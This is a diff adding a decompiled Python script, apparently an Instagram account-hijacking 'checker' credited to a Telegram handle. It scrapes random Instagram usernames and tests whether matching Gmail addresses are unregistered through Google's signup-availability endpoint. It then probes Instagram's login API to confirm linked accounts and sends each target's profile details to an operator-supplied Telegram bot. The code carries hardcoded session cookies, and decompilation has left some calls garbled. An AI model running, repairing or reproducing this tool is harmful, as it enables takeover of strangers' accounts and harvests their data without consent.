@@ -1,0 +1,217 @@
+# Source Generated with Decompyle++
+# File: 1676480236671_jee.py (Python 3.9)
+
+copyright = '@psh_team'
+import os
+import sys
+import requests
+import webbrowser
+webbrowser.open('https://youtu.be/wsSSNQYpPvM')
+
+try:
+    import requests
+    import os
+    import names
+    import random
+    import time
+    import mechanize
+    import sys
+    from user_agent import generate_user_agent
+    from uuid import uuid4
+except:
+    
+    os.system('pip install requsets')
+    os.system('pip install names')
+    os.system('pip install user_agent')
+    os.system('pip install uid')
+    os.system('pip install uuid')
+    os.system('pip install mechanize')
+    os.system('clear')
+import requests
+import os
+import names
+import json
+import random
+import requests
+import os
+import names
+import random
+import time
+from user_agent import generate_user_agent
+from uuid import uuid4
+uid = uuid4()
+import requests
+import random
+import mechanize
+import time
+Z = '\x1b[1;31m'
+X = '\x1b[1;33m'
+Z1 = '\x1b[2;31m'
+F = '\x1b[2;32m'
+A = '\x1b[2;39m'
+C = '\x1b[2;35m'
+B = '\x1b[2;36m'
+H = '\x1b[1;34m'
+Z2 = '\x1b[1;31m'
+X = '\x1b[1;33m'
+Z1 = '\x1b[2;31m'
+F = '\x1b[2;32m'
+A = '\x1b[3;39m'
+C = '\x1b[2;35m'
+B = '\x1b[2;36m'
+Y = '\x1b[1;34m'
+E1 = '\x1b[8;31m'
+import os
+from pyfiglet import figlet_format
+import sys
+import requests
+Z = '\x1b[1;31m'
+X = '\x1b[1;33m'
+F = '\x1b[2;32m'
+C = '\x1b[1;97m'
+B = '\x1b[2;36m'
+Y = '\x1b[1;34m'
+C = '\x1b[1;97m'
+E = '\x1b[1;31m'
+B = '\x1b[2;36m'
+G = '\x1b[1;32m'
+S = '\x1b[1;33m'
+print(f'''{Y}_________{Z}___________{F}_______________{X}______________{C}___________''')
+print(f''' {Y}◆ {S} {Z}Telegram {C}USER>/ {F}FAYREWS /{X}Name> {Y}TROX  ◆ ''')
+print(f'''{Y}_________{Z}___________{F}_______________{X}______________{C}___________''')
+sid = input(f'''{Z} {F}+{Z} {X}Session ID{F} ➥ ''' + C)
+print(F + '↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣')
+token = input(f'''{F} {Z}+{X} {B} Token{F} ➥ ''' + C)
+print(F + '↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣')
+ID = input(f'''{Z} {F}+{Z} {X} ID{F} ➥ ''' + C)
+print(F + '↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣')
+print('\n')
+os.system('clear')
+head = {
+    'Cookie': 'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid=' + sid }
+l = 0
+b = 0
+u = 0
+m = 0
+P = 0
+x = 0
+G = 0
+aa = 0
+a = 0
+K = 0
+j = 0
+font = 'banner3'
+txt = 'TROX'
+topac = figlet_format(f'''{txt}''',font= f'''{font}''')
+print(B + topac)
+
+def check(email, user):
+    global P, l
+    user = str(user)
+    email = str(email)
+    url = 'https://i.instagram.com/api/v1/accounts/login/'
+    headers = {
+        'User-Agent': 'Instagram 136.0.0.34.124 Android (24/7.0; 640dpi; 1440x2560; HUAWEI; LON-L29; HWLON; hi3660; en_US)',
+        'Accept': '*/*',
+        'Cookie': 'missing',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US',
+        'X-IG-Capabilities': '3brTvw==',
+        'X-IG-Connection-Type': 'WIFI',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'Host': 'i.instagram.com' }
+    data = {
+        'uuid': uid,
+        'password': '@whisper666',
+        'username': email,
+        'device_id': uid,
+        'from_reg': 'false',
+        '_csrftoken': 'missing',
+        'login_attempt_countn': '0' }
+    req = requests.post(url, headers=headers, data=data).json()
+    if req['message'] == 'The password you entered is incorrect. Please try again.':
+        P += 1
+        os.system('cls' if os.name == 'nt' else 'clear')
+        fff = '\x1b[1;32m'
+        print(fff + topac)
+        print(f''' \x1b[1;36mGmail True\x1b[1;33m ➪  \x1b[1;32m{P} \n \x1b[1;97mBaNd email\x1b[1;33m ➪ \x1b[1;31m {u} \n \x1b[1;97mBaNd InSTa\x1b[1;33m ➪ \x1b[1;31m {l} \n \x1b[1;33mUsEr\x1b[1;36m ⇨ \x1b[1;97m {email}''')
+        rr = requests.get(f'''https://www.instagram.com/{user}/?__a=1&__d=dis''', head, **('headers',)).json()
+        nam = str(rr['graphql']['user']['full_name'])
+        iddd = str(rr['graphql']['user']['id'])
+        fol = str(rr['graphql']['user']['edge_followed_by']['count'])
+        fols = str(rr['graphql']['user']['edge_follow']['count'])
+        isp = str(rr['graphql']['user']['is_private'])
+        bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
+        re = requests.get(f'''https://o7aa.pythonanywhere.com/?id={iddd}''')
+        ree = re.json()
+        dat = ree['date']
+        tlg = f''' TROX صادلك حساب 🩻\n<↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣>\n .🧪.  𝙽𝙴𝙼𝙴 : {nam}\n .🧪.  𝚄𝚂𝙴𝚁 : @{user}\n .🧪. 𝙴𝙼𝙰𝙸𝙻 : {email}\n .🧪.  F𝙾𝙻𝙻𝙾𝚆𝙴𝙸𝙽𝙶 : {fols}\n .🦠.  F𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 : {fol}\n .🧪.  P𝙾𝚂𝚃𝚂 : {bio}\n .🦠.  D𝙰𝚃𝙰 : {dat}\n .🧬.  𝙻𝙸𝙽𝙺 : https://www.instagram.com/{user}\n<↣↣↣↣↣↣↣↣↣↣↣↣↣↣↣>\n.🩻.T𝙴𝙻𝙴𝙶𝚁𝙰𝙼 : .🧬. @FAYREWS .🦠.'''
+        print(f'''{E}====================================''')
+        requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg))
+    if req['message'] == "The username you entered doesn't appear to belong to an account. Please check your username and try again.":
+        l += 1
+        os.system('cls' if os.name == 'nt' else 'clear')
+        fff = '\x1b[1;32m'
+        print(fff + topac)
+        print(f''' \x1b[1;36mGmail True\x1b[2;35m ➪  \x1b[1;32m{P} \n \x1b[2;35mBaNd email\x1b[1;33m ➪ \x1b[1;31m {u} \n \x1b[1;33mBaNd InSTa\x1b[1;33m ➪ \x1b[1;31m {l} \n \x1b[1;33mUsEr\x1b[1;33m ⇨ \x1b[1;97m {email}''')
+
+
+def yahoo(email, user):
+    global K, u
+    eml = str(email)
+    email = eml.split('@')[0] + '@gmail.com'
+    url = 'https://android.clients.google.com/setup/checkavail'
+    h = {
+        'Content-Length': '98',
+        'Content-Type': 'text/plain; charset=UTF-8',
+        'Host': 'android.clients.google.com',
+        'Connection': 'Keep-Alive',
+        'user-agent': 'GoogleLoginService/1.3(m0 JSS15J)' }
+    d = json.dumps({
+        'username': email,
+        'version': '3',
+        'firstName': 'AbaLahb',
+        'lastName': 'AbuJahl' })
+    res = requests.post(url, d, h, **('data', 'headers'))
+    if res.json()['status'] == 'SUCCESS':
+        check(email, user)
+        K += 1
+        os.system('cls' if os.name == 'nt' else 'clear')
+        fff = '\x1b[1;32m'
+        print(fff + topac)
+        print(f''' \x1b[1;36mGmail True\x1b[2;35m ➪  \x1b[1;32m{P} \n \x1b[2;35mBaNd email\x1b[1;33m ➪ \x1b[1;31m {u} \n \x1b[1;33mBaNd InSTa\x1b[1;33m ➪ \x1b[1;31m {l} \n \x1b[1;33mUsEr\x1b[1;33m ⇨ \x1b[1;97m {email}''')
+    else:
+        u += 1
+        os.system('cls' if os.name == 'nt' else 'clear')
+        fff = '\x1b[1;32m'
+        print(fff + topac)
+        print(f''' \x1b[1;36mGmail True\x1b[2;35m ➪  \x1b[1;32m{P} \n \x1b[2;35mBaNd email\x1b[1;33m ➪ \x1b[1;31m {u} \n \x1b[1;33mBaNd InSTa\x1b[1;33m ➪ \x1b[1;31m {l} \n \x1b[1;33mUsEr\x1b[1;33m ⇨ \x1b[1;97m {email}''')
+
+
+def users():
+    user = '1234567890qwertyuiopasdfghjklzxcvbnm.'
+    num = '56789'
+    rng = str(''.join(random.choice(num) for i in range(1)))
+    name = str(''.join(random.choice(user) for i in range(int(rng))))
+    whisper = requests.get(f'''https://www.instagram.com/web/search/topsearch/?context=blended&query={name}''',headers= head).json()
+    mn = 0
+    
+    try:
+        mn += 1
+        user = str(whisper['users'][mn]['user']['username'])
+        emai = user
+        email = emai + '@gmail.com'
+        yahoo(email, user)
+    except Exception:
+        users()
+        
+        
+        
+        
+        
+
+
+users()
+
+
+
